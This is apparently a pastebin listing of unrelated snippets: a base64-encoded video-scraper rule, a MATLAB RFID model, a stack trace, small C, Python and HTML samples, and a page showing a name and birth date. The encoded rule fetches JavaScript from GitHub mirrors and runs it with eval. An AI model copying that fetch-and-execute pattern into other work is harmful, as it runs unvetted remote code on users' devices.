rqM7xDTi,邀您一起看：鸭奈飞,xiaomianao666,JavaScript,Wednesday 14th of May 2025 08:49:40 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥鸭奈飞@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJqczpcXG5ldmFsKGZldGNoKCdoaWtlcjovL2ZpbGVzL3J1bGVzL3h5cS9oaWtlcm1vdmllLmpzJykpO2hpa2NoYXB0ZXIoKTtcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi6aaZ5oOF5b2x6KeGXCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eSQkaHR0cHM6Ly93d3cubmV0ZmxpeGdjLmNvbSQkZnlwYWdlJCTnlLXlvbEm6L+e57ut5YmnJue7vOiJuibliqjmvKskJDEmMiYzJjQkJDtnZXQ7VVRGLTg7e1VzZXItQWdlbnRATW96aWxsYS81LjAgKExpbnV477yb77ybIEFuZHJvaWQgMTXvvJvvvJsgMjQwN0ZSSzhFQyBCdWlsZC9BUDNBLjI0MDYxNy4wMDjvvJvvvJsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8xMjguMC42NjEzLjEyNyBNb2JpbGUgU2FmYXJpLzUzNy4zNn1cIixcImNvbF90eXBlXCI6XCJtb3ZpZV8xXCIsXCJmaW5kX3J1bGVcIjpcImpzOlxcbmV2YWwoZmV0Y2goJ2hpa2VyOi8vZmlsZXMvcnVsZXMveHlxL2hpa2VybW92aWUuanMnKSk7aGlraG1lcmooKTtcIixcImdyb3VwXCI6XCLikaDovbvlkIjpm4ZcIixcInVhXCI6XCJtb2JpbGVcIixcInByZVJ1bGVcIjpcIi8v6K6+572u5pu05paw6Ze06ZqU5pe26Ze0LOWNleS9jeS4uuaVtOaVsOWkqeOAglxcbnZhciB1cHRpbWUgPSAyO1xcbnZhciBvcHRpb25zID0ge1xcbiAgICB0aW1lb3V0OiA1MDAwLFxcbiAgICBkbnM6ICdodHRwczovL2Rucy5hbGlkbnMuY29tL2Rucy1xdWVyeSdcXG59XFxuXFxuZnVuY3Rpb24gZm9ybyh1cmxsbCkge1xcbiAgICBsZXQgamlhc3UgPSBbXFxuICAgICAgICBcXFwiaHR0cHM6Ly9taXJyb3IuZ2hwcm94eS5jb20vXFxcIixcXG4gICAgICAgIFxcXCJodHRwOi8vZ2guaGFpa3Vvc2hpamllLmNuL1xcXCIsXFxuICAgICAgICBcXFwiaHR0cHM6Ly9nZXQuNjZhLnZpcC9cXFwiLFxcbiAgICAgICAgJ2h0dHA6Ly9mYXN0Z2l0LmNjLycsXFxuICAgICAgICAnaHR0cDovL2dpdGRsLmNuLycsXFxuICAgICAgICAnaHR0cHM6Ly9naC5sbGtrLmNjLycsXFxuICAgICAgICAnaHR0cHM6Ly9naC5jaGppbmEuY29tLydcXG4gICAgXTtcXG4gICAgamlhc3Uuc29ydCgoKSA9PiBNYXRoLnJhbmRvbSgpIC0gMC41KTtcXG4gICAgbGV0IHJlcXUgPSAnJztcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBqaWFzdS5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgbG9nKGppYXN1W2ldKTtcXG4gICAgICAgIHJlcXUgPSBmZXRjaFBDKGppYXN1W2ldICsgdXJsbGwsIG9wdGlvbnMpO1xcbiAgICAgICAgaWYgKHJlcXUuc2VhcmNoKC9sYXp5UnVsZS8pICE9IC0xIHx8IHJlcXUuc2VhcmNoKC9cXFxcXFxcInZvZGhyZWZcXFxcXFxcIi8pICE9IC0xKSB7XFxuICAgICAgICAgICAgYnJlYWs7XFxuICAgICAgICB9XFxuICAgIH1cXG4gICAgaWYgKHJlcXUuc2VhcmNoKC9sYXp5UnVsZS8pICE9IC0xIHx8IHJlcXUuc2VhcmNoKC9cXFxcXFxcInZvZGhyZWZcXFxcXFxcIi8pICE9IC0xKSB7XFxuICAgICAgICByZXR1cm4gcmVxdTtcXG4gICAgfVxcbiAgICBsb2codXJsbGwpO1xcbiAgICByZXF1ID0gZmV0Y2godXJsbGwsIG9wdGlvbnMpO1xcbiAgICByZXR1cm4gcmVxdTtcXG59XFxuXFxuZnVuY3Rpb24gdXBydWxlZmlsZSgpIHtcXG4gICAgdmFyIHJ1bGVqcyA9IGZvcm8oJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94eXEyNTQyNDUvSGlrZXJSdWxlL21haW4vaGlrZXJtb3ZpZS5qcycpO1xcblxcbiAgICBpZiAocnVsZWpzLnNlYXJjaCgvbGF6eVJ1bGUvKSAhPSAtMSkge1xcbiAgICAgICAgd3JpdGVGaWxlKFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL3h5cS9oaWtlcm1vdmllLmpzXFxcIiwgcnVsZWpzKTtcXG4gICAgfVxcblxcbiAgICB2YXIgcnVsZWpzb24gPSBmb3JvKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veHlxMjU0MjQ1L0hpa2VyUnVsZS9tYWluL2hpa2VybW92aWUuanNvbicpO1xcblxcbiAgICBpZiAocnVsZWpzb24uc2VhcmNoKC9cXFxcXFxcInZvZGhyZWZcXFxcXFxcIi8pICE9IC0xKSB7XFxuICAgICAgICB3cml0ZUZpbGUoXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMveHlxL2hpa2VybW92aWUuanNvblxcXCIsIHJ1bGVqc29uKTtcXG4gICAgfVxcbiAgICBpZiAocnVsZWpzLnNlYXJjaCgvbGF6eVJ1bGUvKSAhPSAtMSAmJiBydWxlanNvbi5zZWFyY2goL1xcXFxcXFwidm9kaHJlZlxcXFxcXFwiLykgIT0gLTEpIHtcXG4gICAgICAgIHdyaXRlRmlsZShcXFwiaGlrZXI6Ly9maWxlcy9ydWxlcy94eXEvaGlrZXJ1cGRhdGUudHh0XFxcIiwgbmV3IERhdGUoKSArICcnKTtcXG4gICAgICAgIGNvbmZpcm0oe1xcbiAgICAgICAgICAgIHRpdGxlOiAn5o+Q56S6JyxcXG4gICAgICAgICAgICBjb250ZW50OiAn6Ieq5Yqo5pu05paw5a6M5oiQJ1xcbiAgICAgICAgfSk7XFxuICAgIH0gZWxzZSB7XFxuICAgICAgICBjb25maXJtKHtcXG4gICAgICAgICAgICB0aXRsZTogJ+aPkOekuicsXFxuICAgICAgICAgICAgY29udGVudDogJ+iHquWKqOabtOaWsOWksei0pSdcXG4gICAgICAgIH0pO1xcbiAgICB9XFxufVxcblxcblxcblxcbi8v5qOA5rWL5piv5ZCm5pyJ5YaZ5YWl5pe26Ze05LiO6KeE5YiZ55qEanPmj5Lku7bmlofku7ZcXG5pZiAoZmlsZUV4aXN0KFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL3h5cS9oaWtlcnVwZGF0ZS50eHRcXFwiKSAmJiBmaWxlRXhpc3QoXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMveHlxL2hpa2VybW92aWUuanNcXFwiKSAmJiBmaWxlRXhpc3QoXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMveHlxL2hpa2VybW92aWUuanNvblxcXCIpKSB7XFxuICAgIC8v6K6h566X5pe26Ze06Ze06ZqUXFxuICAgIHZhciBzdGFydCA9IG5ldyBEYXRlKGZldGNoKFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL3h5cS9oaWtlcnVwZGF0ZS50eHRcXFwiLCB7fSkpO1xcbiAgICB2YXIgbm93dCA9IG5ldyBEYXRlKCk7XFxuICAgIHZhciBEX1QgPSBub3d0LmdldFRpbWUoKSAtIHN0YXJ0LmdldFRpbWUoKTtcXG4gICAgdmFyIERfRCA9IERfVCAvICgxMDAwICogMzYwMCAqIDI0KTtcXG4gICAgdmFyIHRkaWYgPSBwYXJzZUludChEX0QpICsgJyc7XFxuICAgIC8vbG9nKHRkaWYpO1xcbiAgICAvL+m7mOiupOmXtOmalOi2hei/h+iuvue9ruWkqeaVsOWwseWPluS4gOasoeS6keerr+aWh+S7tlxcbiAgICBpZiAodGRpZiA+PSB1cHRpbWUgfHwgdGRpZiA8IDApIHtcXG4gICAgICAgIHVwcnVsZWZpbGUoKTtcXG4gICAgfVxcbn0gZWxzZSB7XFxuICAgIC8v5aaC5p6c5bCR5LiA5Liq5paH5Lu25bCx6Ieq5Yqo5Y+W5LqR56uv5paH5Lu2XFxuICAgIHVwcnVsZWZpbGUoKTtcXG59XFxuXFxuXFxuXFxuLy/miafooYzpnIDopoHpooTlpITnkIbnmoTnq5nngrlcXG52YXIgbGFjID0gZmV0Y2goJ2hpa2VyOi8vZmlsZXMvcnVsZXMveHlxL2hpa2VybW92aWUuanMnKTtcXG4vL2xvZyhsYWMubGVuZ3RoKTtcXG5pZiAobGFjLnNlYXJjaCgvbGF6eVJ1bGUvKSAhPSAtMSkge1xcbiAgICBldmFsKGxhYyk7XFxuICAgIGhpa2VycHJlKCk7XFxufSBlbHNlIHtcXG4gICAgLy/lpoLmnpzmnKzlnLDmlofku7bkuI3lr7nlsIblsJ3or5Xoh6rkv67lpI1cXG4gICAgdXBydWxlZmlsZSgpO1xcbiAgICBzZXRFcnJvcign6KeE5YiZ5L+u5aSN5a6M5oiQ77yM5aaC5pyJ6Zeu6aKY6K+35Y+N6aaI44CCJylcXG59XCIsXCJwYWdlc1wiOlwiW11cIn0iLCJwaWNVcmwiOiJodHRwczovL3d3dy5uZXRmbGl4Z2MuY29tL3VwbG9hZC9teHByb2Ntcy8yMDIzMDMzMS0xLzEzNjJiMzY0MDMzNGM4NzY5NDhkOTE2OTBmODUwZjgwLnBuZ0BSZWZlcmVyPSIsInRpdGxlIjoi6bit5aWI6aOeIn0=
EFE7EUQk,vinee rp servers,vadim1290,JSON,Wednesday 14th of May 2025 08:46:36 AM CDT,"[
    {
      ""color"": ""FF0000"",
      ""dopname"": ""sandbot"",
      ""maxonline"": 50,
      ""name"": ""Red"",
      ""online"": 22,
      ""debi_host"": ""51.75.232.69"",
      ""debi_port"": 1909
    }
]
"
JDn7kUyS,Untitled,GibMeclay,MatLab,Wednesday 14th of May 2025 08:26:46 AM CDT,"close all ;
clear; clc;

%% Parametry systemu
frequencies = [865e6, 915e6];               % [Hz], podstawowe cz?stotliwo?ci
frequency_range = 800e6:5e6:1000e6;         % [Hz], zakres modelowania
rPwrMax = 8.8;                                % Maksymalny promie? [m] Zmierzone w modelu idealnym
r_values = [0.9, 0.7, 0.5] * rPwrMax;       % Promienie analizy
mode_tag_methods = {'real', 'ideal'};      % Dwie metody modelowania anteny taga

%% Parametry anteny czytnika
G0R_dBi = 7;                                % Maksymalny zysk [dBi]
HPBWR = 58;                                 % Half-Power Beamwidth [deg]

%% Parametry ogólne
C_chip = 0.63e-12;  % [F] pojemno?? chipa RFID
Rc = 14.5;        % [Ohm] rezystancja chipa
Za = 293;         % [Ohm] impedancja anteny (przyj?ta sta?a)
RC = 0.5;                                   % strata polaryzacyjna [dB]
Ptx_dBm = 30;                               % Moc nadajnika [dBm]
Pr_min_dBm = -21;                           % Czu?o?? taga [dBm]

%% Wczytanie danych z 4nec2 (charakterystyka promieniowania taga)

rawData = readtable('book3.csv', 'Delimiter', ';');
theta = rawData{:,1};
phi = rawData{:,2};
gain = rawData{:,3};
gain(gain < -100) = NaN;
valid = ~isnan(gain);
theta = theta(valid);
phi = phi(valid);
gain = gain(valid);
[uniquePairs, ia, ~] = unique([theta, phi], 'rows');
theta = uniquePairs(:,1);
phi = uniquePairs(:,2);
gain = gain(ia);
F_tag = scatteredInterpolant(theta, phi, gain, 'linear', 'nearest');

%% Funkcja anteny czytnika (modelowana)
readerPattern = @(theta, G0, HPBW) G0 - 3*(abs(theta)/HPBW).^(-log(0.5)/log(cosd(HPBWR/2)));
idealTagPattern = @(theta) 0;  % Model izotropowy (sta?y zysk 0 dBi)

%% Analiza i wykresy: PT(f) dla ró?nych r i metod

for m = 1:length(mode_tag_methods)
    method = mode_tag_methods{m};
    figure('Name', sprintf('Metoda: %s', method)); hold on;
    legends = {};

    for r = r_values
        PT = zeros(size(frequency_range));
        for i = 1:length(frequency_range)
            f = frequency_range(i);
            lambda = 3e8 / f;
            gain_reader = readerPattern(30, G0R_dBi, HPBWR);

            if strcmp(method, 'real')
                gain_tag = F_tag(90, -30);
            else
                gain_tag = idealTagPattern(0);
            end

            L = (4 * pi * r / lambda)^2;
            L_dB = 10 * log10(L);
          %% Obliczenie dopasowania impedancyjnego
Xc = 2 * pi * f * C_chip;
Zc = Rc + 1i * Xc;
Z_tag = Zc;
Z_chip = Zc;
ReZ_tag = real(Z_tag);
ReZ_chip = real(Z_chip);
ImZ_sum = imag(Z_tag + Z_chip);
ReZ_sum = real(Z_tag + Z_chip);
matching_loss = (4 * ReZ_tag * ReZ_chip) / (ReZ_sum^2 + ImZ_sum^2);

% Moc dostarczona z uwzgl?dnieniem odbicia
Pr_lin = 10^((Ptx_dBm + gain_reader + gain_tag - L_dB - RC)/10);
Pd_lin = Pr_lin * matching_loss;
PT(i) = 2*log10(Pd_lin);
        end
        plot(frequency_range/1e6, PT);
        legends{end+1} = sprintf('r = %.1f m', r);
    end

    xlabel('Cz?stotliwo?? [MHz]');
    ylabel('Moc dostarczona do taga [dBm]');
    title(sprintf('Charakterystyka PT(f) – metoda: %s', method));
    legend(legends, 'Location', 'best');
    grid on;
end

%% Mapa 2D mocy odbieranej Pr(x, y) dla f = 865 MHz
f_map = 865e6;
lambda = 3e8 / f_map;
range = -10:0.2:15;
[X, Y] = meshgrid(range, range);

for m = 1:length(mode_tag_methods)
    method = mode_tag_methods{m};
    Pr_map = zeros(size(X));

    for i = 1:size(X, 1)
        for j = 1:size(X, 2)
            x = X(i, j);
            y = Y(i, j);
            r = sqrt(x^2 + y^2);
            theta = atan2d(y, sqrt(x^2));
            theta = mod(theta + 360, 360);

            gain_reader = readerPattern(theta, G0R_dBi, HPBWR);
            if strcmp(method, 'real')
                gain_tag = F_tag(theta, -30);
            else
                gain_tag = idealTagPattern(theta);
            end

            L = (4 * pi * r / lambda)^2;
            L_dB = 10 * log10(L);
          %% Impedancyjne dopasowanie
Xc = 2 * pi * f_map * C_chip;
Zc = Rc + 1i * Xc;
Gamma = (Zc - Za) / (Zc + Za);
matching_loss = 1 - abs(Gamma)^2;

% Moc z uwzgl?dnieniem odbicia
Pr_lin = 10^((Ptx_dBm + gain_reader + gain_tag - L_dB - RC)/10);
Pd_lin = Pr_lin * matching_loss;
Pr_map(i, j) = 10 * log10(Pd_lin);
        end
    end

    figure;
    imagesc(range, range, Pr_map .* (Y >= 0));
    colormap('jet');         % lub 'parula', 'hot', 'turbo'
    caxis([-40 0]);          % ustalony zakres dBm
    hold on;
    [C, h] = contour(X, Y, Pr_map, [-21 -21], 'LineColor', 'k', 'LineWidth', 1.5);
    clabel(C, h, '-18 dBm');
    set(gca, 'YDir', 'normal');
    colorbar;
    title(sprintf('Mapa Pr(x,y) dla f = %.0f MHz, metoda: %s', f_map/1e6, method));
    xlabel('x [m]'); ylabel('y [m]');
end

%% Ocena poprawnej pracy dla f = 865, 915 MHz
theta_tag = 90;
phi_tag = -30;

fprintf('\n--- Ocena poprawnej pracy (f = 865, 915 MHz) ---\n');
for f = frequencies
    lambda = 3e8 / f;
    fprintf('\nCzestotliwosc: %.0f MHz\n', f/1e6);
    for r = r_values
        gain_reader = readerPattern(theta_tag, G0R_dBi, HPBWR);
        gain_tag = F_tag(theta_tag, phi_tag);
        L = (4 * pi * r / lambda)^2;
        L_dB = 10 * log10(L);
       %% Dopasowanie impedancji
Xc = 2 * pi * f * C_chip;
Zc = Rc + 1i * Xc;
Gamma = (Zc - Za) / (Zc + Za);
matching_loss = 1 - abs(Gamma)^2;
Pr_lin = 10^((Ptx_dBm + gain_reader + gain_tag - L_dB - RC)/10);
Pd_lin = Pr_lin * matching_loss;
Pr_dBm = 10 * log10(Pd_lin);
        status = 'NIE';
        if Pr_dBm >= Pr_min_dBm
            status = 'TAK';
        end
        fprintf('r = %.2f m, Pr = %.2f dBm, Poprawna praca: ''%s''\n', r, Pr_dBm, status);
    end
end
"
WPGDfuRH,2025-05-14T13:59:56.030629,powerampache,PHP,Wednesday 14th of May 2025 07:59:56 AM CDT,"1.01-80-play (80) - DB: 83
retrofit2.HttpException: HTTP 404 Not Found
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

"
giuFnq6z,Number Pyramid,Realratnadwip,C,Wednesday 14th of May 2025 07:20:12 AM CDT,"#include <stdio.h>

void main()
{
	int i, j, lim;
	printf(""Enter Limit: "");
	scanf(""%d"",&lim);

	i = 1;
	while (i <= lim)
	{
		j = 1;
		while (j <= i)
		{
			printf(""%d"",j);
			j++;
		}
		printf(""\n"");
		i++;
	}
}"
PZTXaQGP,Untitled,Ahmed_Negm,C++,Wednesday 14th of May 2025 07:15:53 AM CDT,"def classify_single_image(model, image_path):
    try:
        # Read and preprocess the image
        image = cv2.imread(image_path)
        if image is None:
            return None, ""Could not load image""
            
        # Make a copy for display
        display_image = copy.deepcopy(image)
        
        # Preprocess the image
        image = cv2.resize(image, (CONST.IMG_SIZE, CONST.IMG_SIZE))
        image = image.astype('float32') / 255.0  # Normalize to [0,1] range
        image = np.expand_dims(image, axis=0)  # Add batch dimension
        
        # Make prediction
        pred = model.predict(image, verbose=0)
        class_idx = np.argmax(pred, axis=1)[0]
        confidence = float(pred[0][class_idx])
        
        # Map prediction to class name
        class_names = {0: 'Cat', 1: 'Dog'}
        prediction = class_names[class_idx]
        
        # Add text to image
        font = cv2.FONT_HERSHEY_SIMPLEX
        location = (20, 30)
        fontScale = 0.8
        fontColor = (0, 255, 0)  # Green
        lineType = 2
        
        text = f""{prediction}: {confidence:.2%}""
        cv2.putText(display_image, text, location, font, fontScale, fontColor, lineType)
        
        # Save the annotated image
        output_path = ""prediction_result.jpg""
        cv2.imwrite(output_path, display_image)
        
        return prediction, confidence, output_path
        
    except Exception as e:
        return None, f""Error during classification: {str(e)}"""
s6QnjA8S,profile_details.css,horozov86,CSS,Wednesday 14th of May 2025 07:00:44 AM CDT,"html, body {
    height: 100%;
    margin: 0;
    padding: 0;
    font-family: sans-serif;
    background: linear-gradient(#141e30, #243b55);
    color: #fff;
}

/* Основен контейнер */
.info-section {
    position: absolute;
    top: 50%;
    left: 50%;
    width: 400px;
    padding: 40px;
    transform: translate(-50%, -50%);
    background: rgba(0, 0, 0, 0.5);
    box-sizing: border-box;
    box-shadow: 0 15px 25px rgba(0, 0, 0, 0.6);
    border-radius: 10px;
}

/* Заглавие */
.info-section h1 {
    margin-bottom: 30px;
    text-align: center;
    font-size: 28px;
    color: #f4ec03;
}

/* Снимка на профила */
.profile-photo {
    text-align: center;
    margin-bottom: 20px;
}

.profile-photo img {
    width: 120px;
    height: 120px;
    border-radius: 50%;
    border: 3px solid #f4ec03;
    object-fit: cover;
}

/* Описание */
.description {
    font-size: 16px;
    margin-bottom: 10px;
    padding-left: 5px;
    border-left: 3px solid #f4ec03;
}

/* Бутони */
.buttons {
    margin-top: 30px;
    text-align: center;
    display: flex;
    justify-content: space-between;
}

.edit-button,
.delete-button {
    padding: 10px 20px;
    color: #f4ec03;
    font-size: 14px;
    text-decoration: none;
    text-transform: uppercase;
    border: 1px solid #f4ec03;
    border-radius: 5px;
    background: transparent;
    transition: all 0.3s ease;
    width: 45%;
    text-align: center;
}

.edit-button:hover,
.delete-button:hover {
    background-color: #f4ec03;
    color: #141e30;
    box-shadow: 0 0 10px #f4ec03;
}"
afrDJRDn,profile_details.html,horozov86,HTML 5,Wednesday 14th of May 2025 06:59:08 AM CDT,"
<!-- {% extends 'base.html' %} -->
<!-- {% load static %} -->

<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <title>Profile Details</title>
    <!-- <link rel=""stylesheet"" href=""{% static 'css/profile_details.css' %}""> -->
    <link rel=""stylesheet"" href=""css/profile_details.css""> <!-- Локален стил -->
</head>
<body>
    <div class=""info-section"">
        <h1>Profile Details</h1>

        <div class=""profile-photo"">
            <!-- {% if profile.profile_photo %} -->
            <!-- <img class=""car-img"" src=""{{ profile.profile_photo.url }}"" alt=""Profile Image"" /> -->
            <!-- {% else %} -->
            <img class=""car-img"" src=""images/default_profile_image.png"" alt=""Default Profile Image"" />
            <!-- {% endif %} -->
        </div>

        <!-- <p class=""description"">Email: {{ profile.user.email }}</p> -->
        <p class=""description"">First name: Georgi</p>
        
        <!-- <p class=""description"">Email: {{ profile.user.email }}</p> -->
        <p class=""description"">Last name: Horozov</p>
        
        <!-- <p class=""description"">Email: {{ profile.user.email }}</p> -->
        <p class=""description"">Age: 39</p>
        
        <!-- <p class=""description"">Email: {{ profile.user.email }}</p> -->
        <p class=""description"">Date of birth: 14-03-1986</p>
        
        <!-- <p class=""description"">Email: {{ profile.user.email }}</p> -->
        <p class=""description"">Country: Bulgaria</p>
        
        <!-- <p class=""description"">Email: {{ profile.user.email }}</p> -->
        <p class=""description"">City: Bulgaria</p>

        <!-- <p class=""description"">Address: {{ profile.address }}</p> -->
        <p class=""description"">Address: 123 Main Street, Sofia</p>

        <!-- Action Buttons -->
        <div class=""buttons"">
            <!-- <a href=""{% url 'profile_update' pk=object.pk %}"" class=""edit-button"">Edit</a> -->
            <!-- <a href=""{% url 'profile_delete' pk=object.pk %}"" class=""delete-button"">Delete</a> -->
            <a href=""#"" class=""edit-button"">Edit</a>
            <a href=""#"" class=""delete-button"">Delete</a>
        </div>
    </div>

    <!-- Optional Form for Additional Actions -->
    <!-- Optional Form for Additional Actions -->
<!--     <form method=""post"" enctype=""multipart/form-data"">
        {% csrf_token %}
        {{ form.as_p }}
    </form>
    {% endblock %} -->
</body>
</html>"
